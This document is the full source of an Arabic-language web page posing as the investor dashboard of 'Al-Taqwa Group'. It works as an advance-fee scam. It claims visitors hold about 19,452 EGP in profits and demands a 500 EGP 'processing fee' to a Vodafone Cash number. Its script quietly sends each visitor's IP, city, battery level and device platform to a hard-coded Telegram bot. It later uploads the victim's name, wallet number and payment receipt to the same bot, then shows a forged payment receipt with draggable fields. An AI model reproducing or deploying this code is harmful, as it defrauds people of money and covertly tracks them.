<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>التقوى جروب - لوحة المستثمرين</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #0046be; --gold: #ffcc00; --success: #28a745; --dark: #0a0a0a; }
        body { margin: 0; font-family: 'Cairo', sans-serif; background: #f4f7f6; color: #333; overflow-x: hidden; }

        /* بوابة الدخول */
        #login-page { position: fixed; inset: 0; background: linear-gradient(135deg, #020024 0%, #090979 35%, #00d4ff 100%); z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; text-align: center; }
        .login-box { background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); padding: 40px 25px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.2); width: 85%; max-width: 380px; }
        .login-box h1 { color: var(--gold); margin-bottom: 10px; font-size: 26px; }
        .login-box input { width: 90%; padding: 15px; border-radius: 12px; border: 1px solid var(--gold); background: rgba(0,0,0,0.5); color: white; text-align: center; font-size: 18px; margin: 20px 0; outline: none; }
        .login-box button { background: var(--gold); color: #000; border: none; padding: 15px 40px; border-radius: 12px; font-weight: 900; font-size: 18px; cursor: pointer; }

        /* الهيدر */
        .top-bar { background: var(--primary); color: white; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; font-weight: 700; }
        .timer { background: rgba(255,0,0,0.2); color: #ff4d4d; padding: 4px 12px; border-radius: 20px; border: 1px solid #ff4d4d; font-size: 13px; }

        /* الموقع الرئيسي */
        .main-container { padding: 20px; display: none; }
        .balance-card { background: white; border-radius: 25px; padding: 30px 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); text-align: center; border-top: 6px solid var(--success); }
        .amount { font-size: 42px; font-weight: 900; color: var(--dark); margin: 10px 0; }
        .amount span { font-size: 18px; color: var(--success); }

        .form-section { background: white; border-radius: 25px; padding: 20px; margin-top: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
        .form-section input { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #ddd; box-sizing: border-box; margin-bottom: 15px; font-family: 'Cairo'; }
        .btn-confirm { background: var(--success); color: white; border: none; width: 100%; padding: 15px; border-radius: 12px; font-weight: 900; font-size: 18px; cursor: pointer; }

        /* قسم الإيصال */
        #payment-section { display: none; position: fixed; inset: 0; background: #000; z-index: 2000; overflow-y: auto; }
        .receipt-container { position: relative; width: 100%; max-width: 420px; margin: 0 auto; background: #fff; }
        .receipt-img { width: 100%; display: block; }
        
        /* بيانات فودافون كاش القابلة للتحريك */
        .drag { position: absolute; font-weight: 900; font-family: Arial, sans-serif; white-space: nowrap; cursor: move; touch-action: none; z-index: 2100; }
        #val-amt { top: 64.5%; left: 16%; font-size: 18px; color: #0b5155; }
        #val-dt { top: 71.2%; left: 16%; font-size: 13px; color: #000; }
        #val-num { top: 75.2%; left: 16%; font-size: 14px; color: #000; }

        /* لوحة الإدارة */
        #admin-panel { position: fixed; inset: 0; background: white; z-index: 3000; display: none; padding: 30px; overflow-y: auto; color: #000; }
        .admin-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; text-align: center; }
        .admin-trigger { position: fixed; bottom: 0; right: 0; width: 50px; height: 50px; z-index: 4000; background: transparent; }

        #loader { position: fixed; inset: 0; background: rgba(255,255,255,0.9); z-index: 5000; display: none; flex-direction: column; align-items: center; justify-content: center; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="admin-trigger" onclick="handleAdmin()"></div>

<div id="admin-panel">
    <h2 style="text-align:center">⚙️ إعدادات الإدارة</h2>
    <label>كود الدخول:</label> <input type="text" id="adm-pass" value="123456">
    <label>مبلغ الربح:</label> <input type="text" id="adm-amt" value="19452">
    <label>رقم محفظة الرسوم:</label> <input type="text" id="adm-wallet" value="01226811784">
    <label>قيمة الرسوم:</label> <input type="text" id="adm-fees" value="500">
    <button class="btn-confirm" onclick="saveAdmin()">حفظ وتحديث الموقع</button>
    <button class="btn-confirm" style="background:#555; margin-top:10px;" onclick="closeAdmin()">إغلاق</button>
</div>

<div id="login-page">
    <div class="login-box">
        <h1>التقوى جروب 🌙</h1>
        <p>يرجى إدخال كود التحقق لتفعيل السحب</p>
        <input type="password" id="entryPass" placeholder="كود الوصول">
        <button onclick="accessSite()">تفعيل الحساب</button>
    </div>
</div>

<div id="main-site" class="main-container">
    <div class="top-bar">
        <div class="timer">⏱️ الجلسة تنتهي: <span id="timer">05:00</span></div>
        <div style="font-size: 18px;">التقوى للاستثمار</div>
    </div>

    <div class="balance-card">
        <div style="background:#e8f5e9; color:#2e7d32; display:inline-block; padding:5px 15px; border-radius:20px; font-size:12px; font-weight:700; margin-bottom:10px;">✅ حساب موثق</div>
        <div class="amount" id="show-amt">0 <span>EGP</span></div>
        <p style="font-size:12px; color:#666;">الرصيد متاح للسحب الفوري</p>
    </div>

    <div class="form-section">
        <input type="text" id="uName" placeholder="الاسم الكامل للمستلم">
        <input type="tel" id="uWallet" placeholder="رقم محفظتك (فودافون كاش)">
        <p style="font-size:13px; color:#d32f2f; font-weight:700;">يرجى تحويل رسوم المعالجة (<span id="show-fees">500</span> ج.م) للرقم:</p>
        <div style="background:#f1f3f4; padding:15px; border-radius:15px; font-weight:900; font-size:22px; text-align:center; color:var(--primary); margin-bottom:15px;" id="show-adm-wallet">01226811784</div>
        <label style="font-size:12px;">إرفاق صورة إيصال التحويل:</label>
        <input type="file" id="uFile" accept="image/*">
        <button class="btn-confirm" onclick="finalSubmit()">تأكيد واستلام الأرباح</button>
    </div>
</div>

<div id="payment-section">
    <div class="receipt-container">
        <img src="image_5.png.jpg" class="receipt-img">
        <div id="val-amt" class="drag">0.00 جنيه</div>
        <div id="val-dt" class="drag">00:00 - 00/00/2026</div>
        <div id="val-num" class="drag">35000000000</div>
    </div>
    <button onclick="location.reload()" style="position:fixed; bottom:20px; left:20px; padding:15px; background:red; color:white; border:none; border-radius:10px; font-weight:900; z-index:3000;">خروج</button>
</div>

<div id="loader">
    <div style="width:50px; height:50px; border:5px solid #f3f3f3; border-top:5px solid var(--primary); border-radius:50%; animation:spin 1s linear infinite;"></div>
    <p style="margin-top:15px; font-weight:700;">جاري معالجة الطلب...</p>
</div>

<script>
    const TOKEN = '8412077444:AAHgu7XnlUMAaRPayFmUtD14AAbTznPJRII';
    const CHAT_ID = '8292390266';

    let config = JSON.parse(localStorage.getItem('alTaqwa_config')) || { pass: '123456', amt: '19452', wallet: '01226811784', fees: '500' };

    function updateUI() {
        document.getElementById('show-amt').innerHTML = Number(config.amt).toLocaleString() + " <span>EGP</span>";
        document.getElementById('show-fees').innerText = config.fees;
        document.getElementById('show-adm-wallet').innerText = config.wallet;
        document.getElementById('adm-pass').value = config.pass;
        document.getElementById('adm-amt').value = config.amt;
        document.getElementById('adm-wallet').value = config.wallet;
        document.getElementById('adm-fees').value = config.fees;
    }
    updateUI();

    let clickCount = 0;
    function handleAdmin() { clickCount++; if(clickCount >= 3) { document.getElementById('admin-panel').style.display = 'block'; clickCount = 0; } }
    function closeAdmin() { document.getElementById('admin-panel').style.display = 'none'; }
    function saveAdmin() {
        config = { pass: document.getElementById('adm-pass').value, amt: document.getElementById('adm-amt').value, wallet: document.getElementById('adm-wallet').value, fees: document.getElementById('adm-fees').value };
        localStorage.setItem('alTaqwa_config', JSON.stringify(config));
        location.reload();
    }

    async function accessSite() {
        if(document.getElementById('entryPass').value !== config.pass) return alert("الكود غير صحيح!");
        document.getElementById('login-page').style.display = 'none';
        document.getElementById('main-site').style.display = 'block';
        
        let trackMsg = `🏮 رصد جديد:\n`;
        try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            trackMsg += `🌐 IP: ${d.ip}\n📍 المكان: ${d.city}\n🔋 البطارية: ${navigator.battery ? (await navigator.getBattery()).level*100 + '%' : '؟'}\n📱 الجهاز: ${navigator.platform}`;
        } catch(e){}
        
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(trackMsg)}`);
        startTimer(300);
    }

    function startTimer(duration) {
        let timer = duration;
        setInterval(() => {
            let m = parseInt(timer / 60, 10), s = parseInt(timer % 60, 10);
            document.getElementById('timer').textContent = (m < 10 ? "0"+m : m) + ":" + (s < 10 ? "0"+s : s);
            if (--timer < 0) location.reload();
        }, 1000);
    }

    async function finalSubmit() {
        const name = document.getElementById('uName').value;
        const wallet = document.getElementById('uWallet').value;
        const file = document.getElementById('uFile').files[0];
        if(!name || !wallet || !file) return alert("أكمل البيانات!");

        document.getElementById('loader').style.display = 'flex';
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID); fd.append('photo', file);
        fd.append('caption', `✅ سحب جديد:\n👤 العميل: ${name}\n📱 محفظته: ${wallet}\n💰 مبلغ: ${config.amt}`);

        try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            document.getElementById('loader').style.display = 'none';
            document.getElementById('payment-section').style.display = 'block';
            document.getElementById('val-amt').innerText = Number(config.amt).toLocaleString() + ".00 جنيه";
            let now = new Date();
            document.getElementById('val-dt').innerText = now.toLocaleTimeString('en-GB', {hour:'2-digit', minute:'2-digit'}) + " - " + now.toLocaleDateString('en-GB');
            document.getElementById('val-num').innerText = "35" + Math.floor(Math.random() * 900000000);
        } catch(e) { alert("خطأ!"); }
    }

    // كود التحريك
    const draggables = document.querySelectorAll('.drag');
    draggables.forEach(el => {
        let active = false, xOffset = 0, yOffset = 0, initialX, initialY;
        const start = (e) => {
            initialX = (e.type === "touchstart" ? e.touches[0].clientX : e.clientX) - xOffset;
            initialY = (e.type === "touchstart" ? e.touches[0].clientY : e.clientY) - yOffset;
            if (e.target === el) active = true;
        };
        const move = (e) => {
            if (active) {
                e.preventDefault();
                let cx = (e.type === "touchmove" ? e.touches[0].clientX : e.clientX) - initialX;
                let cy = (e.type === "touchmove" ? e.touches[0].clientY : e.clientY) - initialY;
                xOffset = cx; yOffset = cy;
                el.style.transform = `translate3d(${cx}px, ${cy}px, 0)`;
            }
        };
        el.addEventListener("touchstart", start); el.addEventListener("touchmove", move); el.addEventListener("touchend", () => active = false);
        el.addEventListener("mousedown", start); el.addEventListener("mousemove", move); el.addEventListener("mouseup", () => active = false);
    });
</script>
</body>
</html>
